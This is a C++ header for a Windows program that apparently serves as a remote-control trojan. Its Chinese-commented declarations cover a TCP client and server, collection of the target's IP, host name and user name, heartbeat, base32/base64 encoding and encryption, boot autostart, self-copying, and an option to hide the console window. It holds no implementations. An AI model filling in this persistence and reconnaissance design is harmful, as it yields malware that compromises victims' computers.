#pragma once
#ifndef _TCPSOCKET_H_
#define _TCPSOCKET_H_
#define _CRT_SECURE_NO_WARNINGS 1
#define _WINSOCK_DEPRECATED_NO_WARNINGS 1
#include <io.h>
#include <stdlib.h>
#include <vector>
#include <fstream>  //ifstream
#include <string>   //包含getline()
#include <cmath>
#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <tchar.h>
#include <thread>
#include <atlimage.h>
#include <stdint.h>
#include <Windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

//不显示控制台黑色窗口
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define PORT 65533
//#define err(errMsg) printf("[line: %d]%s failed code %d\n", __LINE__, errMsg, WSAGetLastError())
#define Row BUFSIZ		//定义获取文件名的二维数组大小

static const char BASE32_MAP[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=";
static const uint8_t BASE32_REVERSE_MAP[] =
{
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 26, 27, 28, 29, 30, 31, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 2, 3, 4, 5, 6,
		7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,
};


#ifndef CEIL_POS
#define CEIL_POS(X) (X > (uint64_t)(X) ? (uint64_t)(X+1) : (uint64_t)(X))
#endif
using namespace std;

struct PC_Message
{
	char PCName[BUFSIZ];
	TCHAR UserName[BUFSIZ];
	char IP[BUFSIZ];
};
//打开网络库
bool init_Socket();
//关闭网络库
bool close_Socket();
//创建服务端socket
SOCKET CreatServerScoket();
//创建客户端socket
SOCKET CreatClientScoket(const char* ip);
//获取目标计算机的IP，计算机名以及用户名
bool getmessage(struct PC_Message* messages);
//将TCHAR的类型转换为char
bool TcharToChar(const TCHAR* tchar, char* _char);
//心跳功能
bool HeartBeat(SOCKET fd);
//base32编码函数
void base32encode(char* str, uint64_t len);
//base32解码函数
void base32decode(char* base32Str, uint64_t len);
//base64编码函数
void base64encode(char* str);
//base64解码函数
void base64decode(char* str);
//加密函数
void encode(char* text);
//解密函数
void decode(char* pwd);
//开机自启动
int ComputerStart(char* pathName);
//char转换为lpwstr
LPWSTR CharToLPWSTR(const char* szString);
//自我复制
int copySelf(char* path);
//获取文件名
void GetFileName(SOCKET fd, char FileName[Row], char* str);

#endif // !_TCPSOCKET_H